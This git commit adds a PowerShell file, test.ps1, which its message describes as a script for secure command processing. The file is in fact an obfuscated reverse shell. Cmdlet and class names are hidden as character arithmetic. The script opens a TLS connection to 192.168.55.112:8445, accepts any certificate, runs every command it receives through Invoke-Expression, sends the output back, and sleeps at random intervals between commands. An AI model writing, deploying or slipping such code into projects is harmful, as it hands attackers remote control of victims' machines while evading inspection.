9bb1bfcf371079266100f96eb8a42f4c0ce6ea20
0xbngs <155501702+0xbngs@users.noreply.github.com>
2026-01-06 19:42:24 +0700

    Add PowerShell script for secure command processing
    This script establishes a secure connection and processes commands over it, handling input and output efficiently.

---
+++ test.ps1
@@ -0,0 +1,74 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$IVEhNuqEoXbCNqtN = ([char](178 - 50 - 50) + [char](142 - 41) + [char](2 + 40 + 77) + [char](9 + 5 + 31) + [char](122 - 43) + [char](3 + 95) + [char](206 - 50 - 50) + [char](201 - 50 - 50) + [char](8 + 15 + 76) + [char](216 - 50 - 50))
+$qOtNK6iZN2aaW = ([char](183 - 50 - 50) + [char](21 + 100) + [char](56 + 59) + [char](31 + 85) + [char](134 - 33) + [char](10 + 31 + 68) + [char](14 + 4 + 28) + [char](65 + 13) + [char](94 + 7) + [char](216 - 50 - 50) + [char](146 - 50 - 50) + [char](118 - 35) + [char](211 - 50 - 50) + [char](61 + 38) + [char](128 - 21) + [char](1 + 100) + [char](216 - 50 - 50) + [char](94 + 21) + [char](89 - 43) + [char](111 - 27) + [char](81 + 18) + [char](212 - 50 - 50) + [char](1 + 66) + [char](141 - 33) + [char](134 - 29) + [char](201 - 50 - 50) + [char](65 + 45) + [char](25 + 91))
+$IBPxEHChT3DG = ([char](21 + 17 + 33) + [char](148 - 47) + [char](216 - 50 - 50) + [char](1 + 19 + 63) + [char](138 - 22) + [char](156 - 42) + [char](31 + 31 + 39) + [char](197 - 50 - 50) + [char](152 - 43))
+$MiAiraltqjEjH = ([char](183 - 50 - 50) + [char](158 - 37) + [char](38 + 23 + 54) + [char](10 + 1 + 105) + [char](18 + 23 + 60) + [char](31 + 32 + 46) + [char](14 + 9 + 23) + [char](9 + 5 + 64) + [char](30 + 24 + 47) + [char](80 + 36) + [char](69 - 23) + [char](59 + 24) + [char](201 - 50 - 50) + [char](147 - 48) + [char](129 - 12) + [char](214 - 50 - 50) + [char](15 + 34 + 56) + [char](39 + 77) + [char](3 + 32 + 86) + [char](146 - 50 - 50) + [char](183 - 50 - 50) + [char](31 + 14 + 70) + [char](11 + 97) + [char](183 - 50 - 50) + [char](52 + 64) + [char](70 + 44) + [char](201 - 50 - 50) + [char](119 - 22) + [char](87 + 22))
+$QxKLE6wjzF = ([char](20 + 45) + [char](38 + 39 + 40) + [char](2 + 4 + 110) + [char](23 + 6 + 75) + [char](144 - 43) + [char](105 + 5) + [char](147 - 31) + [char](132 - 27) + [char](199 - 50 - 50) + [char](92 + 5) + [char](30 + 6 + 80) + [char](201 - 50 - 50) + [char](9 + 2 + 54) + [char](20 + 34 + 61) + [char](15 + 24 + 28) + [char](26 + 26 + 56) + [char](78 + 27) + [char](126 - 25) + [char](210 - 50 - 50) + [char](28 + 7 + 81))
+$UMNZQvmzPrC = ([char](1 + 82) + [char](170 - 49) + [char](215 - 50 - 50) + [char](216 - 50 - 50) + [char](99 + 2) + [char](142 - 33) + [char](57 - 11) + [char](178 - 50 - 50) + [char](132 - 31) + [char](216 - 50 - 50) + [char](3 + 19 + 24) + [char](127 - 44) + [char](201 - 50 - 50) + [char](33 + 16 + 50) + [char](38 + 7 + 72) + [char](214 - 50 - 50) + [char](205 - 50 - 50) + [char](32 + 42 + 42) + [char](169 - 48) + [char](146 - 50 - 50) + [char](182 - 50 - 50) + [char](10 + 40 + 51) + [char](16 + 19 + 74) + [char](211 - 50 - 50) + [char](216 - 50 - 50) + [char](149 - 48) + [char](3 + 9 + 55) + [char](32 + 28 + 41) + [char](3 + 111) + [char](134 - 18) + [char](32 + 24 + 49) + [char](202 - 50 - 50) + [char](13 + 45 + 47) + [char](113 - 14) + [char](140 - 43) + [char](216 - 50 - 50) + [char](58 + 43) + [char](186 - 50 - 50) + [char](22 + 75) + [char](145 - 37) + [char](16 + 41 + 48) + [char](4 + 34 + 62) + [char](32 + 17 + 48) + [char](149 - 33) + [char](122 - 17) + [char](34 + 77) + [char](28 + 27 + 55) + [char](19 + 17 + 31) + [char](122 - 25) + [char](208 - 50 - 50) + [char](31 + 77) + [char](8 + 45 + 45) + [char](197 - 50 - 50) + [char](128 - 29) + [char](22 + 85))
+$1ZRTpkEZBE19Xx = ([char](183 - 50 - 50) + [char](27 + 36 + 58) + [char](6 + 109) + [char](216 - 50 - 50) + [char](11 + 41 + 49) + [char](7 + 28 + 74) + [char](146 - 50 - 50) + [char](5 + 15 + 53) + [char](3 + 22 + 54) + [char](82 - 36) + [char](93 - 10) + [char](160 - 44) + [char](10 + 15 + 89) + [char](147 - 46) + [char](10 + 23 + 64) + [char](15 + 8 + 86) + [char](5 + 9 + 73) + [char](105 + 9) + [char](43 + 62) + [char](216 - 50 - 50) + [char](86 + 15) + [char](214 - 50 - 50))
+$ngqndkjexXyU8 = ([char](182 - 50 - 50) + [char](145 - 44) + [char](93 + 4) + [char](200 - 50 - 50))
+$VihoqQIhTYBJisE = ([char](14 + 10 + 63) + [char](130 - 16) + [char](1 + 16 + 88) + [char](84 + 32) + [char](201 - 50 - 50) + [char](176 - 50 - 50) + [char](135 - 30) + [char](41 + 69) + [char](133 - 32))
+$llh5NOO9EdQe6U = ([char](13 + 24 + 36) + [char](210 - 50 - 50) + [char](32 + 39 + 47) + [char](161 - 50) + [char](8 + 43 + 56) + [char](201 - 50 - 50) + [char](7 + 14 + 24) + [char](169 - 50 - 50) + [char](169 - 49) + [char](140 - 28) + [char](134 - 20) + [char](148 - 47) + [char](128 - 13) + [char](5 + 34 + 76) + [char](205 - 50 - 50) + [char](211 - 50 - 50) + [char](28 + 3 + 79))
+$fXGgnkSeKrjJfPX = ([char](11 + 68) + [char](55 + 62) + [char](216 - 50 - 50) + [char](14 + 31) + [char](107 - 24) + [char](21 + 95) + [char](134 - 20) + [char](129 - 24) + [char](125 - 15) + [char](93 + 10))
+$sYrgJjYPP2vd = ([char](183 - 50 - 50) + [char](221 - 50 - 50) + [char](138 - 23) + [char](35 + 81) + [char](14 + 32 + 55) + [char](25 + 34 + 50) + [char](4 + 42) + [char](184 - 50 - 50) + [char](201 - 50 - 50) + [char](161 - 41) + [char](216 - 50 - 50) + [char](146 - 50 - 50) + [char](97 - 28) + [char](25 + 22 + 63) + [char](199 - 50 - 50) + [char](211 - 50 - 50) + [char](33 + 67) + [char](205 - 50 - 50) + [char](151 - 41) + [char](124 - 21))
+$NOWHLRYwJPr = ([char](60 + 23) + [char](170 - 49) + [char](21 + 94) + [char](15 + 12 + 89) + [char](201 - 50 - 50) + [char](137 - 28) + [char](5 + 2 + 39) + [char](72 + 10) + [char](197 - 50 - 50) + [char](35 + 10 + 65) + [char](111 - 11) + [char](20 + 31 + 60) + [char](153 - 44))
+$YvnNetUmqY = ([char](27 + 17 + 39) + [char](216 - 50 - 50) + [char](143 - 46) + [char](214 - 50 - 50) + [char](25 + 30 + 61) + [char](145 - 50 - 50) + [char](63 + 20) + [char](131 - 23) + [char](23 + 37 + 41) + [char](14 + 18 + 69) + [char](212 - 50 - 50))
+$p0myBeEWFA58F = ([char](103 - 36) + [char](208 - 50 - 50) + [char](17 + 9 + 85) + [char](32 + 16 + 67) + [char](26 + 28 + 47))
+$WBnmAZyHYxod = ([char](78 - 11) + [char](208 - 50 - 50) + [char](150 - 39) + [char](215 - 50 - 50) + [char](201 - 50 - 50))
+$SrjuORmsIgSWq = ([char](46 + 21) + [char](12 + 28 + 68) + [char](211 - 50 - 50) + [char](125 - 10) + [char](115 - 14))
+
+$Y6XedpKbxt = 20000
+$9GOtn6t61CjmRU = 70000
+$WBc1JpaXXnhX = & $IVEhNuqEoXbCNqtN $NOWHLRYwJPr
+
+if ((-not $MiAiraltqjEjH) -or (-not $qOtNK6iZN2aaW) -or (-not $UMNZQvmzPrC)) {
+    exit
+}
+
+try {
+    $tvAQQJhBicAU = "192.168.55.112"
+    $HfEx4DeDNFPsnqo = 8445
+
+    $qOtNK6iZN2aaW = & $IVEhNuqEoXbCNqtN $qOtNK6iZN2aaW($tvAQQJhBicAU, $HfEx4DeDNFPsnqo)
+    $ixHoQrZWgjRZalIZ = $qOtNK6iZN2aaW.$IBPxEHChT3DG()
+
+    $wa7QOpzxDf = { $true } -as $UMNZQvmzPrC
+    $MiAiraltqjEjH = & $IVEhNuqEoXbCNqtN $MiAiraltqjEjH($ixHoQrZWgjRZalIZ, $false, $wa7QOpzxDf)
+
+$MiAiraltqjEjH.AuthenticateAsClient($tvAQQJhBicAU, $null, [System.Security.Authentication.SslProtocols]::Tls12, $false)
+
+    $lkaBlASCIxRr = & $IVEhNuqEoXbCNqtN $1ZRTpkEZBE19Xx($MiAiraltqjEjH)
+    $lkaBlASCIxRr.AutoFlush = $true
+
+    [byte[]]$wg1FAQAtwT7 = New-Object byte[] 4096
+
+    while ($true) {
+        $JcbQxWzdYGtGLT = $MiAiraltqjEjH.$ngqndkjexXyU8($wg1FAQAtwT7, 0, $wg1FAQAtwT7.Length)
+        if ($JcbQxWzdYGtGLT -le 0) { break }
+
+        $ehqygmB3EbCdQXXN = [System.Text.Encoding]::UTF8.GetString($wg1FAQAtwT7, 0, $JcbQxWzdYGtGLT).Trim()
+
+        if ($ehqygmB3EbCdQXXN.Length -gt 0) {
+            $LVLdQUxTpfC = try {
+                ( & $llh5NOO9EdQe6U $ehqygmB3EbCdQXXN 2>&1 | & $fXGgnkSeKrjJfPX ).Trim()
+            } catch {
+                ($_ | & $fXGgnkSeKrjJfPX ).Trim()
+            }
+
+            if ([string]::IsNullOrWhiteSpace($LVLdQUxTpfC)) {
+                $LVLdQUxTpfC = "[+] Command executed successfully (no output)"
+            }
+
+            $lkaBlASCIxRr.$VihoqQIhTYBJisE($LVLdQUxTpfC + "`n---END---`n")
+        }
+
+        $VygJV92nuI = $WBc1JpaXXnhX.Next($Y6XedpKbxt, $9GOtn6t61CjmRU)
+        & $YvnNetUmqY -Milliseconds $VygJV92nuI
+    }
+
+} catch {
+} finally {
+    if ($lkaBlASCIxRr) { $lkaBlASCIxRr.$p0myBeEWFA58F() }
+    if ($MiAiraltqjEjH) { $MiAiraltqjEjH.$WBnmAZyHYxod() }
+    if ($qOtNK6iZN2aaW) { $qOtNK6iZN2aaW.$SrjuORmsIgSWq() }
+}
